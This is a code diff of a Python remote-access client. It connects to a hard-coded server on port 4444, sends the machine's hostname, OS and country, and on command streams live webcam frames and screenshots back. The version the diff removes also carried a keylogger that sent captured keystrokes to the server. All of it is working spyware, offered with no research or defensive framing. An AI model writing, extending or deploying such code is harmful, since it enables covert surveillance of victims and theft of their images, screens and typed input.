@@ -1,86 +1,66 @@
 import socket
 import cv2
-import mss
-import keyboard
-import threading
-import os
+import pyautogui
+import struct
+import pickle
 import platform
-import time
 import requests
+import threading
+import time
 
-SERVER_HOST = "10.0.1.33"  # Replace with your server's IP address
+SERVER_IP = "10.0.1.33"  # Replace with the actual server IP
 SERVER_PORT = 4444
 
-def webcam_stream(client_socket):
+def get_system_info():
+    """Fetch system information like OS and country."""
+    os_info = platform.platform()
+    try:
+        ip_info = requests.get("http://ipinfo.io").json()
+        country = ip_info.get("country", "Unknown")
+    except:
+        country = "Unknown"
+    return os_info, country
+
+def send_webcam_data(sock):
+    """Send live webcam frames to the server."""
     cap = cv2.VideoCapture(0)
     while True:
         ret, frame = cap.read()
         if not ret:
             break
         _, buffer = cv2.imencode('.jpg', frame)
-        client_socket.sendall(buffer.tobytes())
-        time.sleep(0.1)
+        data = pickle.dumps(buffer)
+        sock.sendall(struct.pack("Q", len(data)) + data)
     cap.release()
 
-def screen_share(client_socket):
-    with mss.mss() as sct:
-        while True:
-            screenshot = sct.grab(sct.monitors[0])
-            _, buffer = cv2.imencode('.jpg', screenshot.rgb)
-            client_socket.sendall(buffer.tobytes())
-            time.sleep(0.1)
-
-def keylogger(client_socket):
-    def send_keys():
-        while True:
-            keys = keyboard.record(until='enter')
-            keylog = ""
-            for key in keys:
-                name = key.name
-                if name in ["space", "enter", "tab"]:
-                    keylog += f"[{name.upper()}]"
-                elif name in ["caps lock", "ctrl", "shift", "alt", "backspace", "esc"]:
-                    continue
-                else:
-                    keylog += name
-            client_socket.sendall(keylog.encode())
-            time.sleep(0.1)
-    threading.Thread(target=send_keys).start()
-
-def fetch_country():
-    try:
-        response = requests.get("https://ipinfo.io/json")
-        if response.status_code == 200:
-            data = response.json()
-            return data.get("country", "Unknown")
-    except:
-        return "Unknown"
-
-def handle_commands(client_socket):
+def send_screenshots(sock):
+    """Send live screenshots to the server."""
     while True:
-        try:
-            command = client_socket.recv(1024).decode()
-            if command == "start_webcam":
-                threading.Thread(target=webcam_stream, args=(client_socket,)).start()
-            elif command == "start_screen":
-                threading.Thread(target=screen_share, args=(client_socket,)).start()
-            elif command == "start_keymon":
-                keylogger(client_socket)
-            elif command == "kill":
-                break
-        except:
+        screenshot = pyautogui.screenshot()
+        _, buffer = cv2.imencode('.jpg', screenshot)
+        data = pickle.dumps(buffer)
+        sock.sendall(struct.pack("Q", len(data)) + data)
+        time.sleep(0.5)  # Adjust for frame rate
+
+def handle_server_commands(sock):
+    """Handle commands received from the server."""
+    while True:
+        cmd = sock.recv(1024).decode()
+        if cmd == "kill":
+            sock.close()
             break
+        elif cmd == "webcam":
+            send_webcam_data(sock)
+        elif cmd == "screenshot":
+            send_screenshots(sock)
 
 def main():
-    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    try:
-        client_socket.connect((SERVER_HOST, SERVER_PORT))
-        client_socket.send(f"{platform.system()} {platform.release()} {platform.architecture()[0]}".encode())
-        country = fetch_country()
-        client_socket.send(country.encode())
-        handle_commands(client_socket)
-    except:
-        client_socket.close()
+    """Main client logic."""
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect((SERVER_IP, SERVER_PORT))
+    os_info, country = get_system_info()
+    sock.send(f"{socket.gethostname()}|{os_info}|{country}".encode())
+    handle_server_commands(sock)
 
 if __name__ == "__main__":
     main()
